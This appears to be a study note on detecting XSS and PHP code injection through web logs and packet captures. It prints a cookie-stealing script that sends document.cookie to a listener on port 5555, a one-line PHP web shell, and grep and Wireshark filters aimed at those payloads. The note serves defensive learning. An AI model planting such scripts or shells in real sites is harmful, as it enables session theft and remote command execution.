## Detecting XSS and Code Injection in Web Traffic

This note explains, in my own words, how to recognize both client‑side (XSS) and server‑side code injection using logs and PCAPs.

---

### 1. Cross-Site Scripting in Practice

With Cross‑Site Scripting (XSS), the attacker’s goal is to get **the victim’s browser** to run malicious JavaScript that came from a trusted site.

Because the script is served from your domain:

- The browser happily sends **cookies, localStorage, and session data**.  
- The script can read and exfiltrate that data.  
- The Same‑Origin Policy works **for** the attacker instead of against them.

The site becomes the delivery vehicle for stealing user data or driving them to phishing pages.

---

### 2. Example Scenario: Weird Internal HTTP Traffic

If you suddenly see browsers inside your network sending repeated requests to an unfamiliar internal host or odd port, that can be a sign that:

- A page has an injected `<script>` tag.  
- The script is beaconing or exfiltrating data in the background.

---

### 3. Injection Styles

#### 3.1 Browser-Side (XSS)

An attacker posting a malicious comment or parameter might inject a script like:

```html
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const req = new XMLHttpRequest();
    req.open("GET", url + "?" + params);
    req.send();
  });
</script>
```

Behaviour:

- Runs automatically when the page loads.  
- Reads `document.cookie`.  
- Sends it to an attacker‑controlled listener on port `5555`.

#### 3.2 Server-Side Code Injection (Example: PHP)

On the backend, unsafe dynamic code constructs allow remote command execution, such as:

```php
<?php system($_GET['cmd']); ?>
```

or:

```php
<?php echo shell_exec('whoami'); ?>
```

The first acts as a crude C2 interface (`?cmd=`). The second leaks system identity.

---

### 4. Detection Approach

You need to look at both **incoming** requests and **outgoing** callbacks.

#### 4.1 Catching the Malicious Input

- **In web logs**

  Search for HTML/JS or dangerous PHP functions in URLs or parameters:

  ```bash
  grep -E "(<script|system\(|eval\(|whoami)" access.log
  ```

- **In PCAPs**

  Look for suspicious content in URIs or POST bodies, for example:

  ```text
  http.request.uri contains "<script>" or http.request.uri contains "php"
  ```

#### 4.2 Catching the Exfil or Callback

- **Strange destinations**  
  Browsers calling out to odd IPs or uncommon ports (like `:5555`) instead of only your normal domains.

- **Giveaway query parameters**  
  GET requests where parameters look like encoded cookies or full session tokens, e.g.:

  ```text
  http.request.uri contains "cookie=" or http.request.uri contains "session="
  ```

- **Telltale Referer**  
  If the outbound request’s `Referer` header points back to a specific page on your site, that page is likely where the injection lives.

Putting all three together (payload in request, weird destination, useful Referer) gives a strong story for an XSS or code‑injection‑driven exfiltration.


